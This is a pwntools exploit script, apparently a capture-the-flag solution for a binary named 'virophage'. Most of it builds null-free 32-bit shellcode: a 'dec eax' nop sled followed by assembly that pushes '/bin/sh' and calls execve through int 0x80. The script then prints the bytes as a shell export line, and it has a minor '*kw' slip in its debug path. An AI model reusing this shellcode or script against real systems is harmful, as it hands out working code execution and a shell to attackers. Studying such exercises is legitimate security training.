
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./virophage') # 64-bit

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode  = b''
shellcode += b'H'*0x100 # dec eax. nop sled
# shellcode += b'\xcc'
shellcode += b'H'
shellcode += asm('''
    xor     edx, edx

    xor eax, eax
    mov al, 0x68
    push ax
    mov ax, 0x732f
    push ax
    mov ax, 0x6e69
    push ax
    mov ax, 0x622f
    push ax

    xor eax, eax
    push eax
    sub esp, 0x40
    lea ebx, [esp+0x44]
    add esp, 0x40
    push ebx

    /* ebx is good */
    mov ecx, esp
    xor     edx, edx    
    mov     al, 0x4b
    sub     al, 0x40
    /* int3 */
    int 0x80
''', arch='i386', bits=32)
for b in shellcode:
    assert(b != 0)

print("export RAW_SHELLCODE=$(echo -n -e '", end='')
for b in shellcode:
    print("\\x{:2x}".format(b),end='')
print("')")
